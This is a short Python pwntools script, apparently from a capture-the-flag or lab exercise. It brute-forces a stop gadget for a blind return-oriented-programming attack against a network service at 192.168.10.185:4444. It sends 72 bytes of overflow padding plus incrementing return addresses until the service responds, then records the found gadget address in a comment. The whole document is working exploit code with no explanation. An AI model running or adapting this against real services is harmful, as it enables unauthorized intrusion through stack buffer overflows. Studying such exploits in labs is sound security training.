from pwn import *
def get_stop(length):
    addr = 0x400000
    f = open('1.txt','w')
    while 1:
        try:
            p = remote('192.168.10.185',4444)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            payload = 'a'*72 + p64(addr)
            p.sendline(payload)
            p.recv()
            p.close()
            print 'one success addr : 0x%x'%(addr)
            f.write("one success addr: 0x%x"% addr)
            f.close()
            return addr
        except Exception:
            addr +=1
            p.close()

get_stop(0x30000)

#stop_gadget -->[0x4006d5]
